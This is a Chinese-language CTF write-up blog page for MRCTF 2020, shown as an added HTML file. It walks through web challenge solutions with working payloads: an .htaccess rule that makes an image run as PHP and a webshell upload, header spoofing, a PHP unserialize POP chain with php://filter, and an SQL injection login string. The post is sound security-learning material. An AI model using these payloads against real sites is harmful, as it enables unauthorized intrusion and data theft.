@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="這波比賽終於寫上了幾題 Web 的題，感覺挺開心了，雖然過程有點曲折（說到底還是我菜 不過學到了一些東西，也使自己的思路更清晰了一些。 Summary很開心的是這次把有思路的 Web 題目都寫出來了，雖然 Typecho 那題也應該能寫出來的，可惜的是還沒找到切入點，思路出了問題。至於 WASM 那題，完全都沒接觸過，所以自然不知道怎麼下手手。這波感覺 Misc 的題目用了很多新的東西，也充分地跟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MRCTF 2020">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/9c2f22e.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="這波比賽終於寫上了幾題 Web 的題，感覺挺開心了，雖然過程有點曲折（說到底還是我菜 不過學到了一些東西，也使自己的思路更清晰了一些。 Summary很開心的是這次把有思路的 Web 題目都寫出來了，雖然 Typecho 那題也應該能寫出來的，可惜的是還沒找到切入點，思路出了問題。至於 WASM 那題，完全都沒接觸過，所以自然不知道怎麼下手手。這波感覺 Misc 的題目用了很多新的東西，也充分地跟">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992627.0b038af998c8bbf635ac62231e141cc89d0f4624.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992628.aHR0cDovL2kwLmhkc2xiLmNvbS9iZnMvYXJjaGl2ZS9mOWZkOGQxNWEyOTQzZWVmMzY2ZmI2MGY5YTFhODhhYmYxOTFhMzM2LnBuZw==">
+<meta property="article:published_time" content="2020-03-30T00:27:54.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:03.851Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992627.0b038af998c8bbf635ac62231e141cc89d0f4624.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>MRCTF 2020</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/9c2f22e.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/95dd4451.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/9c2f22e.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&text=MRCTF 2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&is_video=false&description=MRCTF 2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MRCTF 2020&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/9c2f22e.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&name=MRCTF 2020&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&t=MRCTF 2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflection"><span class="toc-number">2.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">3.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bypass"><span class="toc-number">3.1.</span> <span class="toc-text">ez_bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E5%82%B3%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-number">3.2.</span> <span class="toc-text">你傳你🐎呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E5%A8%83"><span class="toc-number">3.3.</span> <span class="toc-text">套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PYwebsite"><span class="toc-number">3.4.</span> <span class="toc-text">PYwebsite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezpop"><span class="toc-number">3.5.</span> <span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezaudit"><span class="toc-number">3.6.</span> <span class="toc-text">Ezaudit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%B9%B2%E5%9C%B0%E6%94%AF-%E7%94%B2%E5%AD%90"><span class="toc-number">3.7.</span> <span class="toc-text">天干地支+甲子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#keyboard"><span class="toc-number">3.8.</span> <span class="toc-text">keyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vigenere"><span class="toc-number">3.9.</span> <span class="toc-text">vigenere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%83%E5%B1%A4%E5%A5%97%E8%B7%AF"><span class="toc-number">3.10.</span> <span class="toc-text">千層套路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploration"><span class="toc-number">4.</span> <span class="toc-text">Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E5%BC%95%E6%95%B8%E7%9A%84%E5%9B%9E%E8%BB%8A%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">POST 引數的回車符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-%E9%87%9D%E5%B0%8D%E6%AA%94%E6%A1%88%E5%AD%97%E5%B0%BE%E8%A8%AD%E5%AE%9A-Content-Type"><span class="toc-number">4.2.</span> <span class="toc-text">Nginx 針對檔案字尾設定 Content-Type</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        MRCTF 2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-30T00:27:54.000Z" itemprop="datePublished">2020-03-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>這波比賽終於寫上了幾題 Web 的題，感覺挺開心了，雖然過程有點曲折（說到底還是我菜 不過學到了一些東西，也使自己的思路更清晰了一些。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>很開心的是這次把有思路的 Web 題目都寫出來了，雖然 Typecho 那題也應該能寫出來的，可惜的是還沒找到切入點，思路出了問題。至於 WASM 那題，完全都沒接觸過，所以自然不知道怎麼下手手。這波感覺 Misc 的題目用了很多新的東西，也充分地跟聲波鬥智鬥勇了，雖然最後沒完全寫出來，也學了不少東西。至於 Crypto 嘛，認真寫了的題裡倒是沒啥新奇的。</p>
+<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>雖然這次沒有因為一道題而不去看其他的，但是出現了新的問題，一個單詞的拼寫浪費了大量的時間去檢查，應該更加細心一點的。另外一點就是熟悉的東西真的太少了，會的東西也很少QAQ</p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">is_numberic</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p>
+<p>這題感覺是直白的程式碼審計，一上來就給了段程式碼。稍微看了一下之後發現兩個點，MD5的 <code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code> 可以簡單地用陣列繞過。<code>is_numberic</code> 可以加個 <code>%0</code> 來繞過。因此，直接傳兩個 GET 引數 <code>id[]=1&amp;gg[]=2</code> 加上一個 POST 引數 <code>passwd=1234567%0</code> 即可拿到 flag。</p>
+<h3 id="你傳你🐎呢"><a href="#你傳你🐎呢" class="headerlink" title="你傳你🐎呢"></a>你傳你🐎呢</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Apache · htaccess</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p>
+<p>這題一開始我沒注意到用的 Apache 然後瘋狂嘗試各種改包，結果都失敗了。其實要先上傳個 .htaccess，這是 Apache 獨有的機制。（當然 nginx 也可以用不一樣的方法實現，甚至使 nginx 支援 .htaccess）因此，寫個 .htaccess 使 jpg 檔案解析為 php 從而執行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;crack.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，要先攔截這個資料包然後修改 <code>Content-Type</code> 才能成功上傳，也可以先選一張圖片，然後修改 <code>filename</code> 和內容（我就是用的這個套路）。完成之後再寫一段一句話木馬，記事本存起來拓展名改成 <code>.jpg</code> 就好。然後上傳之後嘗試訪問一下，沒問題之後直接拿菜刀連上去根目錄找 flag。（其實是因為試了幾次之後發現 <code>system()</code> 啥的都沒給，其實還可以用 <code>include()</code> 啥的，但是當時想著，不如直接上菜刀）</p>
+<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Char</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Strings · Request</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p>
+<p>上來看一手頁面原始碼，於是找到了第一步。要求大概是要 <code>b_u_p_t</code> 但是不給 <code>_</code>，加一個簡單的正則繞過。於是構造一波 <code>...？b.u.p.t=23333%0a</code> 成功拿到下一步線索 <code>FLAG is in secrettw.php</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>訪問 <code>secrettw.php</code> 之後發現頁面原始碼中有一段 JSFuck，丟到 Console 裡面執行一下，提示 <code>post me Merak</code>。於是照著嘗試了一下，拿到一段程式碼。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>首先照著程式碼給的要求構造 GET 請求，因為有個 <code>file_get_contents()</code> 函式，所以構造 <code>$_GET[&#39;2333&#39;]</code> 有兩種方法，<code>php://input</code> + POST 或者直接用 <code>data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code> 來構造。觀察到 <code>$_GET[&#39;file&#39;]</code> 這個檔案會首先被 <code>change()</code> 然後再輸出檔案內容，所以需要先把 flag.php 倒著 <code>change()</code> 一次，這樣之後就能輸出 flag.php 從而拿到 flag。於是寫一波 <code>RecChange()</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RecChange</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$re</span> = base64_encode(<span class="variable">$re</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>將 flag.php <code>RecChange()</code> 之後拼接到 payload 中。在看程式碼，要求 <code>$ip === 127.0.0.1</code>，於是用 <code>Client-IP: 127.0.0.1</code> 這個 header 達成。於是 payload 構造完成，得到 <code>.../secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</code>。最後，根據程式碼，去除掉最開始的 POST 引數，請求之後檢視網頁原始碼即得 flag。</p>
+<h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p>
+<p>這題一開始給了個很有梗的網頁（事實證明這題都很有梗），找了找網頁原始碼，發現一個 flag.php。直接訪問之後又是一個很有梗的頁面，關鍵詞是 IP。於是果斷試一手 <code>X-Forwarded-For: 127.0.0.1</code>，訪問後成功在網頁原始碼中找到 flag。</p>
+<h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP 偽協議</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p>
+<p>這題一開始就給了一段原始碼，仔細檢視之後知道就是反序列化的考點。很明顯，<code>include()</code> 就是可以利用的地方，於是一路往下找，<code>__invoke()</code>，這裡要求以呼叫函式的方式呼叫一個物件。這點使用 <code>__get()</code> 可以實現，而這又要求獲取一個類中不可達的屬性。在 <code>__wakeup()</code> 中有一個 <code>$this-&gt;source</code> 的引數，使得 <code>source</code> 被當作一個字串而觸發 <code>__toString()</code>。而恰好 <code>__toString()</code> 可以觸發 <code>__get()</code>。這樣一系列的觸發就完成了，因為知道 flag 在 flag.php 中，因此要在 <code>include()</code> 中使用 php 偽協議來包含這個檔案。於是稍加修改程式碼然後得到序列化的結果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$p2</span>-&gt;p = <span class="variable">$p1</span>;</span><br><span class="line"><span class="variable">$p3</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$p3</span>-&gt;str = <span class="variable">$p2</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$exp</span>-&gt;source = <span class="variable">$p3</span>;</span><br><span class="line"><span class="variable">$dexp</span> = serialize(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>這樣就能得到序列化的結果。因為涉及到保護欄位，所以在構造 payload 的時候記得把欄位名前面的空格恢復成\x00，不然會導致反序列化失效從而無法執行。這裡構造完成之後用 Python 或者 BurpSuite 傳送資料包之後可以在響應中得到一串 base64 文字，解碼後可以找到 flag。</p>
+<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">php_mt_seed</span></p>
+<p>不愧是好看的 CSS，找了半天沒有找到切入點，然後<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>告訴我說有原始碼。（我沒掃出來）於是我就直接下載了一份。不過檢視原始碼的時候找到了 <code>.../login.html</code>，結合原始碼中的公鑰私鑰和隨機數生成，查了一下搜尋引擎之後找到了 php_mt_seed 這個工具。於是將原始碼註釋中給出的公鑰整理，然後使用這個工具算出種子。得到的種子是 1775196155。</p>
+<p>設定好種子之後，開始跑私鑰。需要注意的是，這個公鑰需要使用 PHP 5.6.x 才能夠對得上。於是以此生成公鑰和私鑰，得到的私鑰是 XuNhoueCDCGc。將其整合到 payload 中，然後再簡單地過一下 password 的 SQL 注入。最後的 POST 資料是這樣的 <code>Private_key=XuNhoueCDCGc&amp;login=%E7%99%BB%E5%BD%95&amp;password=1&#39; or 1=1 #&amp;username=admin</code> ，訪問之後可得 flag。</p>
+<h3 id="天干地支-甲子"><a href="#天干地支-甲子" class="headerlink" title="天干地支+甲子"></a>天干地支+甲子</h3><p>給出的資訊是 <code>甲戌 甲寅 甲寅 癸卯 己酉 甲寅 辛丑</code>，經過大家的提醒之後找了個干支表，對著將每一年轉換成了數字 <code>11 51 51 40 46 51 38 </code>。然後題目要求加一個甲子，也就是六十年，加上之後數字變成這樣 <code>71 111 111 100 106 111 98</code>，將其進行十進位制的編碼轉換之後，得到了 flag 的內容 <code>Goodjob</code>。</p>
+<h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>這題給出的資訊是 <code>6 666 22 444 555 33 7 44 666 66 33</code>。觀察一下可以發現，1 和 0 都沒有出現過，加上數字有重複且不超過三，比較符合九鍵拼音的鍵盤。於是嘗試解密一波，得到 <code>MOBILEPHONE</code>。此即 flag 的內容。</p>
